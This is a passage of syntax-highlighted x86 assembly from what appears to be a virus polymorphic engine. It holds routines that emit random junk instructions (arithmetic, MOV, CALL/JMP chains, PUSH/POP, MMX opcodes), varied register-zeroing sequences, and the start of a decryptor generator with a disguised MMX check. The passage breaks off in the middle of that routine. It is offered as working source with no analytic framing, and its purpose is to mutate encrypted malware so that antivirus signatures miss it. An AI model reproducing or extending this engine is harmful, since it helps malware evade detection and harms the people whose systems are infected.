    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Generates any arithmetic operation with an immediate with EAX:</span><span class="sc0">
</span><span class="sc1">; ADD/OR/ADC/SBB/AND/SUB/XOR/CMP EAX,IMM32</span><span class="sc0">

</span><span class="sc5">@@gen_arithmetic_eax_imm32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00111000b</span><span class="sc0">            </span><span class="sc1">; [ADD,OR,ADC,SBB,AND,SUB,XOR,CMP]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000101b</span><span class="sc0">            
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Generates a mov immediate to 32 bit reg:</span><span class="sc0">
</span><span class="sc1">;       MOV     REG32,IMM32</span><span class="sc0">

</span><span class="sc5">@@gen_mov_reg32_imm32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@get_register</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Generates mov immediate to 8bit reg:</span><span class="sc0">
</span><span class="sc1">;       MOV     REG8,IMM8</span><span class="sc0">

</span><span class="sc5">@@gen_mov_reg8_imm8</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@is_register</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@quitthisshit</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@use_msb</span><span class="sc0">
</span><span class="sc5">@@put_it</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">       
</span><span class="sc5">@@quitthisshit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@@use_msb</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000100b</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@put_it</span><span class="sc0">

</span><span class="sc1">; Generates CALLs to subroutines:</span><span class="sc0">
</span><span class="sc1">;       CALL    @@1</span><span class="sc0">
</span><span class="sc1">;       [...]</span><span class="sc0">
</span><span class="sc1">;       JMP     @@2</span><span class="sc0">
</span><span class="sc1">;       [...]</span><span class="sc0">
</span><span class="sc1">;  @@1: [...]</span><span class="sc0">
</span><span class="sc1">;       RET</span><span class="sc0">
</span><span class="sc1">;       [...]</span><span class="sc0">
</span><span class="sc1">;  @@2: [...]</span><span class="sc0">

</span><span class="sc5">@@gen_call_to_subroutine</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">@@do_anything</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Generate push/garbage/pop structure (allows recursivity):</span><span class="sc0">
</span><span class="sc1">;       PUSH    REG</span><span class="sc0">
</span><span class="sc1">;       [...]</span><span class="sc0">
</span><span class="sc1">;       POP     REG</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@@gen_push_garbage_pop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@get_register</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; MMX Group 1:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; PUNPCKLBW/PUNPCKLWD/PUNPCKLDQ/PACKSSWB/PCMPGTB/PCMPGTW/PCMPGTD/PACHUSWB</span><span class="sc0">
</span><span class="sc1">; PUNPCKHBW/PUNPCKHWD/PUNPCKHDQ/PACKSSDW</span><span class="sc0">

</span><span class="sc5">@@gen_mmx_group1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">600Fh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@build_mmx_gbg_rib</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@gen_mmx_movq_mm?_mm?</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6F0Fh</span><span class="sc0">                        </span><span class="sc1">; MOVQ MM?,MM?</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@build_mmx_gbg_rib</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@gen_mmx_movd_mm?_reg32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7E0Fh</span><span class="sc0">                        </span><span class="sc1">; MOVD MM?,E??</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@get_mmx_register</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@get_register</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; MMX Group 2:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; PCMPEQB/PCMPEQW/PCMPEQD</span><span class="sc0">

</span><span class="sc5">@@gen_mmx_group2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@build_mmx_gbg_rib</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; MMX Group 3:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; PSRLW/PSRLD/PSRLQ/PMULLW/PSUBUSB/PSUBUSW/PAND/PADDUSB/PADDUSW/PANDN/PSRAW</span><span class="sc0">
</span><span class="sc1">; PSRAD/PMULHW/PSUBSB/PSUBSW/POR/PADDSB/PADDSW/PXOR/PSLLW/PSLLD/PSLLQ/PMULADDWD</span><span class="sc0">

</span><span class="sc5">@@gen_mmx_group3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@__overshit</span><span class="sc0">
</span><span class="sc5">@@eoeo</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0D1h</span><span class="sc4">,</span><span class="sc2">0D2h</span><span class="sc4">,</span><span class="sc2">0D3h</span><span class="sc4">,</span><span class="sc2">0D5h</span><span class="sc4">,</span><span class="sc2">0D8h</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">0DBh</span><span class="sc4">,</span><span class="sc2">0DCh</span><span class="sc4">,</span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E1h</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc2">0E5h</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">0ECh</span><span class="sc4">,</span><span class="sc2">0EDh</span><span class="sc4">,</span><span class="sc2">0EFh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F1h</span><span class="sc4">,</span><span class="sc2">0F2h</span><span class="sc4">,</span><span class="sc2">0F5h</span><span class="sc0">
</span><span class="sc5">sg3tbl</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@eoeo</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">@@__overshit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">sg3tbl</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@build_mmx_gbg_rib</span><span class="sc0">
</span><span class="sc5">@@gmmx_goaway</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@build_mmx_gbg_rib</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@get_mmx_register</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@get_mmx_register</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Generate Onebyters:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; CLD/CMC/SALC/NOP/LAHF/INC EAX/DEC EAX/SAHF/(F)WAIT/CWDE</span><span class="sc0">

</span><span class="sc5">@@gen_onebyter</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@go_overshit</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc2">0F5h</span><span class="sc4">,</span><span class="sc2">0D6h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">9Fh</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc4">,</span><span class="sc2">9Eh</span><span class="sc4">,</span><span class="sc2">9Bh</span><span class="sc4">,</span><span class="sc2">98h</span><span class="sc0">
</span><span class="sc5">@@go_overshit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Generate many possible ways for make a determinated register to be 0:</span><span class="sc0">
</span><span class="sc1">; XOR REG,REG/SUB REG,REG/PUSH 0 POP REG/AND REG,0/MOV REG,0</span><span class="sc0">

</span><span class="sc5">@@gen_zer0_reg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@get_register</span><span class="sc0">                  </span><span class="sc1">; For garbage generators</span><span class="sc0">
</span><span class="sc5">@@gen_zero_reg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@xor_reg_reg</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@sub_reg_reg</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@push_0_pop_reg</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@and_reg_0</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@mov_reg_0</span><span class="sc0">
</span><span class="sc5">@@or_reg_m1_inc_reg</span><span class="sc4">:</span><span class="sc0">       
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">_EAX</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@or_reg_m1</span><span class="sc0">
</span><span class="sc5">@@or_eax_m1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">                          </span><span class="sc1">; OR EAX,-1</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@orm1ir_inc_reg</span><span class="sc0">
</span><span class="sc5">@@or_reg_m1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C883h</span><span class="sc0">                       </span><span class="sc1">; OR REG,-1</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">@@orm1ir_inc_reg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">; INC REG</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@xor_reg_reg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C033h</span><span class="sc0">                       </span><span class="sc1">; XOR REG,REG</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@sub_reg_reg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C02Bh</span><span class="sc0">                       </span><span class="sc1">; SUB REG,REG</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@push_0_pop_reg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">006Ah</span><span class="sc0">                        </span><span class="sc1">; PUSH 00h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">                                   </span><span class="sc1">; POP REG</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@and_reg_0</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">_EAX</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@and_regnoteax_0</span><span class="sc0">
</span><span class="sc5">@@and_eax_0</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@@and_regnoteax_0</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E083h</span><span class="sc0">                       </span><span class="sc1">; AND REG,00</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@@mov_reg_0</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">                         </span><span class="sc1">; MOV REG,00000000</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; --- Decryptor code generators</span><span class="sc0">

</span><span class="sc1">; Generate the routine for check for MMX presence, that should perform exactly</span><span class="sc0">
</span><span class="sc1">; the same action of the following code:</span><span class="sc0">
</span><span class="sc1">;       MOV     EAX,1</span><span class="sc0">
</span><span class="sc1">;       CPUID</span><span class="sc0">
</span><span class="sc1">;       BT      EDX,17h</span><span class="sc0">
</span><span class="sc1">;       JNC     NOT_MMX</span><span class="sc0">

</span><span class="sc5">@@gen_check4mmx</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
